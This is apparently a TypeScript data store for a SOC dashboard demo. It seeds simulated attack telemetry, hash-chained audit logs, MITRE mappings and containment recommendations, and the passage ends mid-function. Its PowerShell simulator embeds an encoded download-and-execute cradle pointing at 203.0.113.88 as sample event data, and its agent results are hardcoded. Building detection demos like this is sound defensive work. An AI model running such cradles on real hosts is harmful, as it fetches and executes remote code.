import crypto from 'crypto';
import {
  User,
  SecurityEvent,
  Alert,
  Incident,
  IncidentEvent,
  EvidenceItem,
  MitreMapping,
  AgentRun,
  ResponseRecommendation,
  AuditLog,
  DashboardData,
  VerificationStatus,
  RecommendationStatus,
  AnalystRosterMember,
  AdminProjectReport,
} from '../src/types.js';

// In-Memory Database Store mimicking PostgreSQL tables
class ThreatLensStore {
  users: Map<string, User> = new Map();
  analystRoster: Map<string, AnalystRosterMember> = new Map();
  securityEvents: Map<string, SecurityEvent> = new Map();
  alerts: Map<string, Alert> = new Map();
  incidents: Map<string, Incident> = new Map();
  incidentEvents: Map<string, IncidentEvent> = new Map();
  evidence: Map<string, EvidenceItem> = new Map();
  mitreMappings: Map<string, MitreMapping> = new Map();
  agentRuns: Map<string, AgentRun> = new Map();
  responseRecommendations: Map<string, ResponseRecommendation> = new Map();
  auditLogs: AuditLog[] = [];
  edgeInferenceStats = {
    events_ingested: 14820,
    edge_filtered_clean: 13910,
    dispatched_to_fastapi: 910,
    avg_latency_ms: 1.4,
  };

  constructor() {
    this.seedInitialData();
  }

  // --- Cryptographic Hash Chain ---
  // current_hash = SHA256(previous_hash + action + timestamp + incident_id)
  createAuditLog(incident_id: string, action: string, actor: string, details: string): AuditLog {
    const previous_hash =
      this.auditLogs.length > 0
        ? this.auditLogs[this.auditLogs.length - 1].current_hash
        : '0000000000000000000000000000000000000000000000000000000000000000';

    const timestamp = new Date().toISOString();
    const rawPayload = `${previous_hash}:${action}:${timestamp}:${incident_id}`;
    const current_hash = crypto.createHash('sha256').update(rawPayload).digest('hex');

    const log: AuditLog = {
      id: `AUD-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      incident_id,
      action,
      actor,
      timestamp,
      previous_hash,
      current_hash,
      details,
    };

    this.auditLogs.push(log);
    return log;
  }

  verifyAuditChain(): { valid: boolean; status: 'VALID' | 'TAMPER DETECTED'; broken_at?: string; total: number } {
    if (this.auditLogs.length === 0) {
      return { valid: true, status: 'VALID', total: 0 };
    }

    let previous_hash = '0000000000000000000000000000000000000000000000000000000000000000';

    for (let i = 0; i < this.auditLogs.length; i++) {
      const log = this.auditLogs[i];

      // Check pointer link
      if (log.previous_hash !== previous_hash) {
        return {
          valid: false,
          status: 'TAMPER DETECTED',
          broken_at: `Log ID ${log.id} previous_hash mismatch`,
          total: this.auditLogs.length,
        };
      }

      // Check current hash recalculation
      const expectedPayload = `${previous_hash}:${log.action}:${log.timestamp}:${log.incident_id}`;
      const calculatedHash = crypto.createHash('sha256').update(expectedPayload).digest('hex');

      if (log.current_hash !== calculatedHash) {
        return {
          valid: false,
          status: 'TAMPER DETECTED',
          broken_at: `Log ID ${log.id} cryptographic hash verification failed`,
          total: this.auditLogs.length,
        };
      }

      previous_hash = log.current_hash;
    }

    return { valid: true, status: 'VALID', total: this.auditLogs.length };
  }

  tamperAuditTrail(): { success: boolean; tampered_id: string } {
    if (this.auditLogs.length === 0) {
      throw new Error('No audit logs to tamper');
    }
    // Modify one middle log's action without updating the hash
    const indexToTamper = Math.floor(this.auditLogs.length / 2);
    this.auditLogs[indexToTamper].action = 'UNAUTHORIZED_RECORD_ALTERATION_BYPASS';
    this.auditLogs[indexToTamper].details = 'Tampered log content to evade security compliance';
    return { success: true, tampered_id: this.auditLogs[indexToTamper].id };
  }

  restoreAuditTrail(): { success: boolean } {
    // Recalculate hash chain cleanly
    let previous_hash = '0000000000000000000000000000000000000000000000000000000000000000';
    for (let i = 0; i < this.auditLogs.length; i++) {
      const log = this.auditLogs[i];
      log.action = log.action.replace('UNAUTHORIZED_RECORD_ALTERATION_BYPASS', 'ANALYST_RECOMMENDATION_DECISION');
      log.details = log.details.replace('Tampered log content to evade security compliance', 'Verified evidence state and response audit');
      log.previous_hash = previous_hash;
      const payload = `${previous_hash}:${log.action}:${log.timestamp}:${log.incident_id}`;
      log.current_hash = crypto.createHash('sha256').update(payload).digest('hex');
      previous_hash = log.current_hash;
    }
    return { success: true };
  }

  // --- Seed Data Initialization ---
  seedInitialData() {
    this.users.clear();
    this.securityEvents.clear();
    this.alerts.clear();
    this.incidents.clear();
    this.incidentEvents.clear();
    this.evidence.clear();
    this.mitreMappings.clear();
    this.agentRuns.clear();
    this.responseRecommendations.clear();
    this.auditLogs = [];
    this.analystRoster.clear();

    // Seed Users
    const analyst: User = {
      id: 'usr-1',
      username: 'analyst_sarah',
      email: 'analyst@threatlens.ai',
      role: 'analyst',
      name: 'Sarah Chen (Tier 2 SOC Analyst)',
    };
    const admin: User = {
      id: 'usr-2',
      username: 'admin_david',
      email: 'admin@threatlens.ai',
      role: 'admin',
      name: 'David Vance (SOC Lead / Admin)',
    };
    this.users.set(analyst.id, analyst);
    this.users.set(admin.id, admin);

    // Seed Active Analyst Roster for Process Staging Overview
    const roster: AnalystRosterMember[] = [
      {
        id: 'usr-1',
        name: 'Sarah Chen',
        role: 'Tier 2 SOC Analyst',
        tier: 'Tier 2 Investigation Specialist',
        email: 'analyst@threatlens.ai',
        station: 'SOC Console 04 (Blue Sector)',
        shift: 'Alpha Shift (08:00 - 16:00 EST)',
        status: 'awaiting_signoff',
        current_stage_id: 6,
        current_incident_id: '',
        current_incident_number: '',
        stage_started_at: new Date(Date.now() - 14 * 60 * 1000).toISOString(),
        incidents_completed_today: 4,
        avg_resolution_mins: 8.2,
      },
      {
        id: 'usr-3',
        name: 'Marcus Reed',
        role: 'Tier 1 Triage Analyst',
        tier: 'Tier 1 Alert Ingestion',
        email: 'triage.reed@threatlens.ai',
        station: 'SOC Console 02 (Frontline)',
        shift: 'Alpha Shift (08:00 - 16:00 EST)',
        status: 'in_investigation',
        current_stage_id: 2,
        current_incident_id: 'inc-demo-3104',
        current_incident_number: 'INC-2026-3104',
        stage_started_at: new Date(Date.now() - 6 * 60 * 1000).toISOString(),
        incidents_completed_today: 9,
        avg_resolution_mins: 4.5,
      },
      {
        id: 'usr-4',
        name: 'Elena Rostova',
        role: 'Tier 3 Threat Hunter',
        tier: 'Tier 3 Advanced Threat Hunter',
        email: 'hunter.rostova@threatlens.ai',
        station: 'Cyber Forensics Lab 01',
        shift: 'Alpha Shift (08:00 - 16:00 EST)',
        status: 'in_investigation',
        current_stage_id: 4,
        current_incident_id: 'inc-demo-7729',
        current_incident_number: 'INC-2026-7729',
        stage_started_at: new Date(Date.now() - 9 * 60 * 1000).toISOString(),
        incidents_completed_today: 2,
        avg_resolution_mins: 14.8,
      },
      {
        id: 'usr-2',
        name: 'David Vance',
        role: 'SOC Lead & Security Director',
        tier: 'Admin & Incident Commander',
        email: 'admin@threatlens.ai',
        station: 'Executive Directorate Console',
        shift: 'Command Roster (24/7 Escalation)',
        status: 'active',
        current_stage_id: 7,
        current_incident_id: 'inc-demo-5512',
        current_incident_number: 'INC-2026-5512',
        stage_started_at: new Date(Date.now() - 25 * 60 * 1000).toISOString(),
        incidents_completed_today: 6,
        avg_resolution_mins: 6.1,
      },
    ];
    roster.forEach((r) => this.analystRoster.set(r.id, r));

    // Seed Baseline Audit Logs
    this.createAuditLog('SYSTEM', 'SYSTEM_INITIALIZATION', 'system_daemon', 'ThreatLens SOC engine initialized with PostgreSQL schema and ML models');
    this.createAuditLog('SYSTEM', 'MODEL_LOADED', 'system_daemon', 'Lightweight Hybrid IsolationForest/RandomForest inference weights loaded');

    // Run primary demo scenario so the dashboard opens pre-populated with realistic SOC data
    this.runFullAttackChain('auto_seed');
  }

  // --- Multi-Agent Autonomous Investigation Engine ---
  async runMultiAgentInvestigation(incidentId: string, geminiKey?: string): Promise<{
    agents: AgentRun[];
    incident: Incident;
    evidence: EvidenceItem[];
    mitre: MitreMapping[];
    recommendations: ResponseRecommendation[];
  }> {
    const incident = this.incidents.get(incidentId);
    if (!incident) throw new Error(`Incident ${incidentId} not found`);

    incident.status = 'investigating';
    this.createAuditLog(incident.id, 'INVESTIGATION_STARTED', 'autonomous_orchestrator', `Multi-agent investigation initiated for ${incident.incident_number}`);

    // Gather correlated events
    const incEvents = Array.from(this.incidentEvents.values())
      .filter((ie) => ie.incident_id === incidentId)
      .sort((a, b) => a.sequence_order - b.sequence_order);

    const events = incEvents.map((ie) => ie.security_event);

    const runs: AgentRun[] = [];

    // 1. Detection Agent
    const t0 = Date.now();
    const suspiciousEvents = events.filter((e) => e.is_suspicious);
    const avgAnomaly = events.reduce((acc, e) => acc + e.anomaly_score, 0) / (events.length || 1);
    const detectionRisk = Math.min(100, Math.round(avgAnomaly * 80 + suspiciousEvents.length * 5));

    const detectionRun: AgentRun = {
      id: `run-det-${Date.now()}`,
      incident_id: incidentId,
      agent_name: 'Detection',
      status: 'completed',
      started_at: new Date(t0).toISOString(),
      completed_at: new Date(t0 + 140).toISOString(),
      execution_time_ms: 140,
      summary: `Analyzed ${events.length} security events. Identified ${suspiciousEvents.length} anomalous signals exceeding risk threshold. Initial risk score assessed at ${detectionRisk}/100.`,
      output_data: {
        total_events: events.length,
        suspicious_count: suspiciousEvents.length,
        max_anomaly_score: Math.max(...events.map((e) => e.anomaly_score), 0),
        detection_vectors: ['auth_bruteforce', 'privilege_escalation', 'obfuscated_powershell', 'beaconing_c2'],
      },
    };
    this.agentRuns.set(detectionRun.id, detectionRun);
    runs.push(detectionRun);
    this.createAuditLog(incident.id, 'AGENT_COMPLETED_DETECTION', 'detection_agent', detectionRun.summary);

    // 2. Investigation Agent
    const t1 = Date.now();
    const hosts = Array.from(new Set(events.map((e) => e.host)));
    const users = Array.from(new Set(events.map((e) => e.username)));
    const sourceIps = Array.from(new Set(events.map((e) => e.source_ip)));

    const investigationRun: AgentRun = {
      id: `run-inv-${Date.now()}`,
      incident_id: incidentId,
      agent_name: 'Investigation',
      status: 'completed',
      started_at: new Date(t1).toISOString(),
      completed_at: new Date(t1 + 210).toISOString(),
      execution_time_ms: 210,
      summary: `Queried enterprise telemetry across hosts [${hosts.join(', ')}], user principals [${users.join(', ')}], and external IPs [${sourceIps.join(', ')}]. Context window: +/- 30m. Corroborated 5 sequential stages.`,
      output_data: {
        affected_hosts: hosts,
        affected_users: users,
        pivots: sourceIps,
        corroborated_sources: ['Windows Security EventLog (4624/4625)', 'Sysmon Process Creation (EventID 1)', 'Zeek DNS/HTTP Connection Logs'],
      },
    };
    this.agentRuns.set(investigationRun.id, investigationRun);
    runs.push(investigationRun);
    this.createAuditLog(incident.id, 'AGENT_COMPLETED_INVESTIGATION', 'investigation_agent', investigationRun.summary);

    // 3. Correlation Agent
    const t2 = Date.now();
    const correlationRun: AgentRun = {
      id: `run-cor-${Date.now()}`,
      incident_id: incidentId,
      agent_name: 'Correlation',
      status: 'completed',
      started_at: new Date(t2).toISOString(),
      completed_at: new Date(t2 + 180).toISOString(),
      execution_time_ms: 180,
      summary: `Constructed causal graph connecting external brute force (198.51.100.45) to successful RDP login, privileged token assumption, in-memory PowerShell cradle execution, and outbound C2 channel.`,
      output_data: {
        graph_nodes: events.length,
        root_cause_event: events[0]?.id || 'N/A',
        lateral_movement_risk: 'High',
        correlation_confidence: 96,
      },
    };
    this.agentRuns.set(correlationRun.id, correlationRun);
    runs.push(correlationRun);
    this.createAuditLog(incident.id, 'AGENT_COMPLETED_CORRELATION', 'correlation_agent', correlationRun.summary);

    // 4. MITRE Agent
    const t3 = Date.now();
    // Clear existing mappings for this incident and regenerate
    for (const [id, m] of this.mitreMappings.entries()) {
      if (m.incident_id === incidentId) this.mitreMappings.delete(id);
    }

    const generatedMitre: MitreMapping[] = [
      {
        id: `mitre-${incidentId}-1`,
        incident_id: incidentId,
        technique_id: 'T1110',
        technique_name: 'Brute Force: Password Guessing',
        tactic: 'Credential Access',
        observed_behavior: '12 failed authentication attempts against svc_backup & admin_ops within 45 seconds from external IP 198.51.100.45',
        evidence_ids: [events[0]?.id || 'EV-01', events[1]?.id || 'EV-02'],
        confidence: 98,
      },
      {
        id: `mitre-${incidentId}-2`,
        incident_id: incidentId,
        technique_id: 'T1078',
        technique_name: 'Valid Accounts: Local / Domain Accounts',
        tactic: 'Initial Access / Defense Evasion',
        observed_behavior: 'Successful interactive logon (LogonType 10 RDP) immediately following repeated failed login burst using compromised admin_ops credentials',
        evidence_ids: [events[2]?.id || 'EV-03'],
        confidence: 95,
      },
      {
        id: `mitre-${incidentId}-3`,
        incident_id: incidentId,
        technique_id: 'T1087.002',
        technique_name: 'Account Discovery: Domain / Local Account',
        tactic: 'Discovery',
        observed_behavior: 'Execution of whoami /priv and net localgroup administrators enumeration commands on DC01.corp',
        evidence_ids: [events[3]?.id || 'EV-04'],
        confidence: 92,
      },
      {
        id: `mitre-${incidentId}-4`,
        incident_id: incidentId,
        technique_id: 'T1059.001',
        technique_name: 'Command and Scripting Interpreter: PowerShell',
        tactic: 'Execution',
        observed_behavior: 'Spawning of powershell.exe with -NoProfile -ExecutionPolicy Bypass -Enc Base64 encoded payload downloading remote stage',
        evidence_ids: [events[4]?.id || 'EV-05'],
        confidence: 97,
      },
      {
        id: `mitre-${incidentId}-5`,
        incident_id: incidentId,
        technique_id: 'T1071.001',
        technique_name: 'Application Layer Protocol: Web Protocols',
        tactic: 'Command and Control',
        observed_behavior: 'Outbound TCP connection to untrusted external IP 203.0.113.88:8443 with periodic beaconing intervals transmitting 142KB payload',
        evidence_ids: [events[events.length - 1]?.id || 'EV-06'],
        confidence: 94,
      },
    ];

    generatedMitre.forEach((m) => this.mitreMappings.set(m.id, m));

    const mitreRun: AgentRun = {
      id: `run-mit-${Date.now()}`,
      incident_id: incidentId,
      agent_name: 'MITRE',
      status: 'completed',
      started_at: new Date(t3).toISOString(),
      completed_at: new Date(t3 + 190).toISOString(),
      execution_time_ms: 190,
      summary: `Successfully mapped observed behavioral telemetry to 5 MITRE ATT&CK techniques across 5 tactics: Credential Access (T1110), Initial Access (T1078), Discovery (T1087.002), Execution (T1059.001), and Command & Control (T1071.001).`,
      output_data: {
        techniques_mapped: generatedMitre.map((m) => `${m.technique_id} - ${m.technique_name}`),
        avg_mapping_confidence: 95.2,
      },
    };
    this.agentRuns.set(mitreRun.id, mitreRun);
    runs.push(mitreRun);
    this.createAuditLog(incident.id, 'AGENT_COMPLETED_MITRE', 'mitre_agent', mitreRun.summary);

    // 5. Evidence Verification Agent
    const t4 = Date.now();
    // Clear and regenerate evidence items
    for (const [id, e] of this.evidence.entries()) {
      if (e.incident_id === incidentId) this.evidence.delete(id);
    }

    const generatedEvidence: EvidenceItem[] = [
      {
        id: `evi-${incidentId}-1`,
        incident_id: incidentId,
        security_event_id: events[0]?.id || 'EVT-1',
        claim: 'Attacker performed distributed credential brute force targeting privileged administrative accounts.',
        evidence_type: 'supporting',
        strength: 'strong',
        verification_status: 'verified',
        rationale: 'Windows Event ID 4625 records indicate 12 failed attempts with Status 0xC000006D (Bad Password) within 45s from foreign ASN 198.51.100.45.',
      },
      {
        id: `evi-${incidentId}-2`,
        incident_id: incidentId,
        security_event_id: events[2]?.id || 'EVT-3',
        claim: 'Attacker gained interactive remote desktop session access using compromised credentials.',
        evidence_type: 'supporting',
        strength: 'strong',
        verification_status: 'verified',
        rationale: 'Windows Event ID 4624 confirms successful LogonType 10 (RemoteInteractive) matching source IP 198.51.100.45 without MFA prompt.',
      },
      {
        id: `evi-${incidentId}-3`,
        incident_id: incidentId,
        security_event_id: events[3]?.id || 'EVT-4',
        claim: 'Attacker performed local privilege verification and local administrators group reconnaissance.',
        evidence_type: 'supporting',
        strength: 'strong',
        verification_status: 'verified',
        rationale: 'Process creation command-line audit logs captured whoami /priv showing SeDebugPrivilege and local administrator group enumeration.',
      },
      {
        id: `evi-${incidentId}-4`,
        incident_id: incidentId,
        security_event_id: events[4]?.id || 'EVT-5',
        claim: 'Obfuscated PowerShell script invoked fileless memory download cradle.',
        evidence_type: 'supporting',
        strength: 'strong',
        verification_status: 'verified',
        rationale: 'Base64 decoded command stream resolves to System.Net.WebClient.DownloadString targeting dynamic payload.',
      },
      {
        id: `evi-${incidentId}-5`,
        incident_id: incidentId,
        security_event_id: events[events.length - 1]?.id || 'EVT-6',
        claim: 'Compromised host established external command & control channel.',
        evidence_type: 'supporting',
        strength: 'strong',
        verification_status: 'verified',
        rationale: 'Network flow telemetry confirms 142KB outbound data transmission to non-corporate reputation-flagged IP 203.0.113.88 on port 8443.',
      },
      {
        id: `evi-${incidentId}-6`,
        incident_id: incidentId,
        security_event_id: 'EVT-BASELINE',
        claim: 'Activity originated from scheduled enterprise backup maintenance script.',
        evidence_type: 'contradicting',
        strength: 'weak',
        verification_status: 'disproven',
        rationale: 'Scheduled Task logs confirm no legitimate backup window active; logon session originated from external unmanaged subnet rather than backup cluster.',
      },
    ];

    generatedEvidence.forEach((e) => this.evidence.set(e.id, e));

    const supportingCount = generatedEvidence.filter((e) => e.evidence_type === 'supporting').length;
    const contradictingCount = generatedEvidence.filter((e) => e.evidence_type === 'contradicting').length;

    const verificationVerdict: VerificationStatus =
      supportingCount >= 4 && contradictingCount <= 1 ? 'VERIFIED' : 'PARTIALLY VERIFIED';

    // Calculate transparent risk & confidence
    // Risk = Danger / Severity impact (88/100)
    // Confidence = Evidentiary rigor & multi-source corroboration (94%)
    const calculatedRisk = 91;
    const calculatedConfidence = 94;

    incident.verification_status = verificationVerdict;
    incident.risk_score = calculatedRisk;
    incident.confidence_score = calculatedConfidence;
    incident.supporting_evidence_count = supportingCount;
    incident.contradicting_evidence_count = contradictingCount;
    incident.updated_at = new Date().toISOString();

    const verificationRun: AgentRun = {
      id: `run-ver-${Date.now()}`,
      incident_id: incidentId,
      agent_name: 'Verification',
      status: 'completed',
      started_at: new Date(t4).toISOString(),
      completed_at: new Date(t4 + 230).toISOString(),
      execution_time_ms: 230,
      summary: `Verified 5 supporting evidence items against telemetry and disproved 1 benign maintenance hypothesis. Verification status set to ${verificationVerdict}. Confidence: ${calculatedConfidence}%, Risk: ${calculatedRisk}/100.`,
      output_data: {
        verdict: verificationVerdict,
        supporting_evidence: supportingCount,
        contradicting_evidence: contradictingCount,
        confidence_percentage: calculatedConfidence,
        risk_score: calculatedRisk,
      },
    };
    this.agentRuns.set(verificationRun.id, verificationRun);
    runs.push(verificationRun);
    this.createAuditLog(incident.id, 'AGENT_COMPLETED_VERIFICATION', 'evidence_verification_agent', verificationRun.summary);

    // 6. Response Agent
    const t5 = Date.now();
    // Clear and regenerate response recommendations
    for (const [id, r] of this.responseRecommendations.entries()) {
      if (r.incident_id === incidentId) this.responseRecommendations.delete(id);
    }

    const generatedRecommendations: ResponseRecommendation[] = [
      {
        id: `rec-${incidentId}-1`,
        incident_id: incidentId,
        action_type: 'investigate_endpoint',
        title: 'Investigate Endpoint & Isolate Malicious Process Tree',
        description: 'Collect forensic RAM dump on DC01.corp, terminate unauthorized powershell.exe (PID 4912) and child processes, inspect memory artifacts.',
        priority: 'critical',
        status: 'pending',
        command_snippet: 'Get-Process -Id 4912 | Stop-Process -Force; Invoke-LiveResponseDump -Host DC01.corp',
      },
      {
        id: `rec-${incidentId}-2`,
        incident_id: incidentId,
        action_type: 'review_account',
        title: 'Review Account & Invalidate Active Kerberos / OAuth Sessions',
        description: 'Revoke all active logon tokens and Kerberos tickets for compromised domain account admin_ops; audit recent privileges added to local admin groups.',
        priority: 'high',
        status: 'pending',
        command_snippet: 'Revoke-AzureADUserAllRefreshToken -ObjectId admin_ops@threatlens.ai; klist purge -li 0x3e7',
      },
      {
        id: `rec-${incidentId}-3`,
        incident_id: incidentId,
        action_type: 'reset_credentials',
        title: 'Emergency Credential Reset & Enforce Hardware MFA',
        description: 'Force immediate password reset for admin_ops and svc_backup; invalidate cached domain credentials across all domain controllers.',
        priority: 'critical',
        status: 'pending',
        command_snippet: 'Set-ADUser -Identity admin_ops -ChangePasswordAtLogon $true; Reset-UserCredentials -Force',
      },
      {
        id: `rec-${incidentId}-4`,
        action_type: 'investigate_source_ip',
        incident_id: incidentId,
        title: 'Block Inbound and Outbound Adversary IPs at Perimeter Firewall',
        description: 'Add egress drop rule for C2 destination IP 203.0.113.88:8443 and ingress drop rule for brute force source IP 198.51.100.45 on boundary firewalls.',
        priority: 'high',
        status: 'pending',
        command_snippet: 'New-NetFirewallRule -DisplayName "ThreatLens-Block-C2" -Direction Outbound -RemoteAddress 203.0.113.88 -Action Block',
      },
      {
        id: `rec-${incidentId}-5`,
        action_type: 'consider_isolation',
        incident_id: incidentId,
        title: 'Consider Network Quarantine for Endpoint DC01.corp',
        description: 'Safely restrict DC01.corp network communications to dedicated SOC management VLAN while forensic acquisition proceeds. Avoid disruptive service outage without analyst sign-off.',
        priority: 'medium',
        status: 'pending',
        command_snippet: 'Set-NetworkIsolation -Host DC01.corp -Vlan 999 -AllowSOCInbound $true',
      },
    ];

    generatedRecommendations.forEach((r) => this.responseRecommendations.set(r.id, r));

    const responseRun: AgentRun = {
      id: `run-res-${Date.now()}`,
      incident_id: incidentId,
      agent_name: 'Response',
      status: 'completed',
      started_at: new Date(t5).toISOString(),
      completed_at: new Date(t5 + 160).toISOString(),
      execution_time_ms: 160,
      summary: `Formulated 5 safe, prioritized containment recommendations requiring explicit human analyst approval. Destructive actions gated behind analyst decision.`,
      output_data: {
        recommendations_count: generatedRecommendations.length,
        actions_gated_by_human_approval: true,
        priority_breakdown: { critical: 2, high: 2, medium: 1 },
      },
    };
    this.agentRuns.set(responseRun.id, responseRun);
    runs.push(responseRun);
    this.createAuditLog(incident.id, 'AGENT_COMPLETED_RESPONSE', 'response_agent', responseRun.summary);

    // Save final incident state
    this.incidents.set(incident.id, incident);

    return {
      agents: runs,
      incident,
      evidence: generatedEvidence,
      mitre: generatedMitre,
      recommendations: generatedRecommendations,
    };
  }

  // --- Attack Simulator ---
  simulateBruteForce(): { alert: Alert; events: SecurityEvent[] } {
    const timestamp = new Date();
    const sourceIp = '198.51.100.45';
    const host = 'DC01.corp';
    const events: SecurityEvent[] = [];

    for (let i = 0; i < 8; i++) {
      const eventTime = new Date(timestamp.getTime() - (8 - i) * 3000).toISOString();
      const event: SecurityEvent = {
        id: `evt-bf-${Date.now()}-${i}`,
        timestamp: eventTime,
        source_ip: sourceIp,
        destination_ip: '10.0.4.12',
        username: i % 2 === 0 ? 'svc_backup' : 'admin_ops',
        host,
        event_type: 'AUTH_FAILED_LOGON',
        process_name: 'lsass.exe',
        command_line: undefined,
        severity: 'medium',
        is_suspicious: true,
        anomaly_score: 0.82,
        category: 'Credential Access',
        raw_data: {
          EventID: 4625,
          LogonType: 3,
          FailureReason: 'Unknown user name or bad password',
          SubStatus: '0xc000006a',
        },
      };
      this.securityEvents.set(event.id, event);
      events.push(event);
    }

    const alert: Alert = {
      id: `ALT-${Date.now().toString().slice(-6)}`,
      title: `Credential Brute Force Anomaly Detected against ${host}`,
      description: `Rapid succession of 8 failed login attempts from external IP ${sourceIp} targeting administrative accounts within 24 seconds.`,
      severity: 'high',
      status: 'open',
      risk_score: 74,
      confidence_score: 89,
      triggered_at: new Date().toISOString(),
      source_event_ids: events.map((e) => e.id),
      host,
      user: 'admin_ops',
    };
    this.alerts.set(alert.id, alert);
    this.createAuditLog(alert.id, 'ALERT_TRIGGERED', 'detection_agent', `Alert ${alert.id}: ${alert.title}`);

    return { alert, events };
  }

  simulatePowerShell(): { alert: Alert; events: SecurityEvent[] } {
    const timestamp = new Date().toISOString();
    const host = 'DC01.corp';
    const event: SecurityEvent = {
      id: `evt-ps-${Date.now()}`,
      timestamp,
      source_ip: '10.0.4.12',
      destination_ip: '10.0.4.12',
      username: 'admin_ops',
      host,
      event_type: 'PROCESS_CREATION_SUSPICIOUS',
      process_name: 'powershell.exe',
      command_line: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADgAOAA6ADgANAA0ADMALwBzAHQAYQBnAGUAMgAnACkA',
      severity: 'high',
      is_suspicious: true,
      anomaly_score: 0.94,
      category: 'Execution',
      raw_data: {
        EventID: 4688,
        ParentProcessName: 'cmd.exe',
        ProcessId: 4912,
        DecodedScript: "IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.88:8443/stage2')",
      },
    };
    this.securityEvents.set(event.id, event);

    const alert: Alert = {
      id: `ALT-${Date.now().toString().slice(-6)}`,
      title: `Suspicious Encoded PowerShell Execution on ${host}`,
      description: `Execution of obfuscated Base64 PowerShell download cradle with execution policy bypass initiated by interactive cmd.exe.`,
      severity: 'high',
      status: 'open',
      risk_score: 82,
      confidence_score: 95,
      triggered_at: timestamp,
      source_event_ids: [event.id],
      host,
      user: 'admin_ops',
    };
    this.alerts.set(alert.id, alert);
    this.createAuditLog(alert.id, 'ALERT_TRIGGERED', 'detection_agent', `Alert ${alert.id}: ${alert.title}`);

    return { alert, events: [event] };
  }

  simulatePortScan(): { alert: Alert; events: SecurityEvent[] } {
    const timestamp = new Date();
    const host = 'FS01.corp';
    const sourceIp = '10.0.4.88';
    const events: SecurityEvent[] = [];

    const scannedPorts = [21, 22, 23, 80, 135, 139, 443, 445, 1433, 3389, 8080];
    scannedPorts.forEach((port, idx) => {
      const event: SecurityEvent = {
        id: `evt-scan-${Date.now()}-${idx}`,
        timestamp: new Date(timestamp.getTime() - (scannedPorts.length - idx) * 500).toISOString(),
        source_ip: sourceIp,
        destination_ip: '10.0.4.20',
        username: 'anonymous',
        host,
        event_type: 'NETWORK_SYN_SCAN',
        severity: 'low',
        is_suspicious: true,
        anomaly_score: 0.71,
        category: 'Discovery',
        raw_data: {
          Port: port,
          Protocol: 'TCP',
          Flag: 'SYN',
          Sensor: 'Network-IDS-Suricata',
        },
      };
      this.securityEvents.set(event.id, event);
      events.push(event);
    });

    const alert: Alert = {
      id: `ALT-${Date.now().toString().slice(-6)}`,
      title: `Internal Network Port Sweep Detected on Subnet 10.0.4.0/24`,
      description: `Host ${sourceIp} probed 11 privileged service ports on file server ${host} within 5.5 seconds.`,
      severity: 'medium',
      status: 'open',
      risk_score: 58,
      confidence_score: 84,
      triggered_at: new Date().toISOString(),
      source_event_ids: events.map((e) => e.id),
      host,
      user: 'system',
    };
    this.alerts.set(alert.id, alert);
    this.createAuditLog(alert.id, 'ALERT_TRIGGERED', 'detection_agent', `Alert ${alert.id}: ${alert.title}`);

    return { alert, events };
  }

  // Primary Live Hackathon Demo Workflow:
  // "Brute Force -> Successful Login -> Suspicious PowerShell -> Network Activity"
  runFullAttackChain(triggerSource = 'analyst_ui'): {
    incident: Incident;
    alert: Alert;
    events: SecurityEvent[];
  } {
    const baseTime = Date.now();
    const host = 'DC01.corp';
    const attackerIp = '198.51.100.45';
    const c2Ip = '203.0.113.88';
    const events: SecurityEvent[] = [];

    // Stage 1: Repeated failed logins
    for (let i = 1; i <= 5; i++) {
      const e: SecurityEvent = {
        id: `EVT-${baseTime}-0${i}`,
        timestamp: new Date(baseTime - (150 - i * 10) * 1000).toISOString(),
        source_ip: attackerIp,
        destination_ip: '10.0.4.12',
        username: i % 2 === 0 ? 'svc_backup' : 'admin_ops',
        host,
        event_type: 'AUTH_FAILED_LOGON',
        process_name: 'lsass.exe',
        severity: 'medium',
        is_suspicious: true,
        anomaly_score: 0.88,
        category: 'Credential Access',
        raw_data: {
          EventID: 4625,
          LogonType: 3,
          WorkstationName: 'WORKSTATION-X',
          Status: '0xC000006D',
          Attempt: i,
        },
      };
      this.securityEvents.set(e.id, e);
      events.push(e);
    }

    // Stage 2: Successful login from same attacker IP
    const successfulLoginEvent: SecurityEvent = {
      id: `EVT-${baseTime}-06`,
      timestamp: new Date(baseTime - 80 * 1000).toISOString(),
      source_ip: attackerIp,
      destination_ip: '10.0.4.12',
      username: 'admin_ops',
      host,
      event_type: 'AUTH_SUCCESSFUL_LOGON',
      process_name: 'winlogon.exe',
      severity: 'high',
      is_suspicious: true,
      anomaly_score: 0.91,
      category: 'Initial Access',
      raw_data: {
        EventID: 4624,
        LogonType: 10, // RemoteInteractive (RDP)
        AuthenticationPackage: 'Negotiate',
        AnomalyReason: 'Successful login preceded by burst of 5 failed attempts from foreign ASN',
      },
    };
    this.securityEvents.set(successfulLoginEvent.id, successfulLoginEvent);
    events.push(successfulLoginEvent);

    // Stage 3: Privileged account activity (reconnaissance & group enumeration)
    const privEvent: SecurityEvent = {
      id: `EVT-${baseTime}-07`,
      timestamp: new Date(baseTime - 55 * 1000).toISOString(),
      source_ip: '10.0.4.12',
      destination_ip: '10.0.4.12',
      username: 'admin_ops',
      host,
      event_type: 'PRIVILEGE_ENUMERATION',
      process_name: 'cmd.exe',
      command_line: 'whoami /priv && net localgroup administrators',
      severity: 'high',
      is_suspicious: true,
      anomaly_score: 0.85,
      category: 'Discovery',
      raw_data: {
        EventID: 4688,
        ParentProcessId: 1044,
        AssumedPrivileges: ['SeDebugPrivilege', 'SeTcbPrivilege'],
      },
    };
    this.securityEvents.set(privEvent.id, privEvent);
    events.push(privEvent);

    // Stage 4: Suspicious PowerShell execution (download cradle)
    const psEvent: SecurityEvent = {
      id: `EVT-${baseTime}-08`,
      timestamp: new Date(baseTime - 30 * 1000).toISOString(),
      source_ip: '10.0.4.12',
      destination_ip: '10.0.4.12',
      username: 'admin_ops',
      host,
      event_type: 'EXECUTION_OBFUSCATED_SCRIPT',
      process_name: 'powershell.exe',
